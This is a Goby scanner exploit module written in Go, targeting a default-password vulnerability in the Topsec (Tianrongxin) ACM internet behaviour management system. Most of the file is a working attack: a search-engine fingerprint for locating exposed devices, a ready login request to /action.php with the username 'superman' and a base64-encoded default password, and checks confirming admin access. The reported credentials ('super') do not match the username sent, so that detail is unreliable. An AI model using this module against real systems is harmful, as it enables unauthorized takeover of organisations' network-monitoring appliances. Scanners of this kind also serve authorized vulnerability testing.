package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Tianrongxin ACM Internet Management System /action.php Default Password Vulnerability",
    "Description": "<p>The Tianrongxin Internet Behavior Management System is a product developed by Tianrongxin Company for network behavior management and content auditing.</p><p>The Tianrongxin Internet Behavior Management System has a default password vulnerability, allowing attackers to directly log in to the system through the default password.</p>",
    "Product": "TOPSEC-IBMS",
    "Homepage": "http://www.topsec.com.cn/",
    "DisclosureDate": "2024-03-26",
    "PostTime": "2024-03-26",
    "Author": "xiaoxing@baimaohui.net",
    "FofaQuery": "body=\"ActiveXObject\" && body=\"name=\\\"dkey_login\\\" \" && body=\"repeat-x left top\"",
    "GobyQuery": "body=\"ActiveXObject\" && body=\"name=\\\"dkey_login\\\" \" && body=\"repeat-x left top\"",
    "Level": "3",
    "Impact": "<p>The Tianrongxin Internet Behavior Management System has a default password vulnerability, allowing attackers to directly log in to the system through the default password.</p>",
    "Recommendation": "<p>1. Change the default password.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/action.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "user_name=superman&user_password=VGFsZW50ITEyMw%3D%3D&language=zh_CN&do=login"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "window.location = \"main.php\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{scheme}}}://super:Talent!123@{{{hostinfo}}}/"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/action.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "user_name=superman&user_password=VGFsZW50ITEyMw%3D%3D&language=zh_CN&do=login"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "window.location = \"main.php\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|NULL|variable|super:Talent!123"
            ]
        }
    ],
    "Tags": [
        "Default Password",
        "HW-2023"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.5",
    "Translation": {
        "CN": {
            "Name": "天融信ACM上网管理系统 /action.php 默认口令漏洞",
            "Product": "天融信-上网行为管理系统",
            "Description": "<p>天融信上网行为管理系统是由天融信公司研发的一款用于网络行为管理和内容审计的产品。</p><p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">天融信上网行为管理系统存在默认口令漏洞，攻击者可以通过默认口令直接登录系统。</span><br></p>",
            "Recommendation": "<p>1. 修改默认口令。</p>",
            "Impact": "<p>天融信上网行为管理系统存在默认口令漏洞，攻击者可以通过默认口令直接登录系统。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Tianrongxin ACM Internet Management System /action.php Default Password Vulnerability",
            "Product": "TOPSEC-IBMS",
            "Description": "<p>The Tianrongxin Internet Behavior Management System is a product developed by Tianrongxin Company for network behavior management and content auditing.</p><p>The Tianrongxin Internet Behavior Management System has a default password vulnerability, allowing attackers to directly log in to the system through the default password.</p>",
            "Recommendation": "<p>1. Change the default password.</p>",
            "Impact": "<p>The Tianrongxin Internet Behavior Management System has a default password vulnerability, allowing attackers to directly log in to the system through the default password.</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
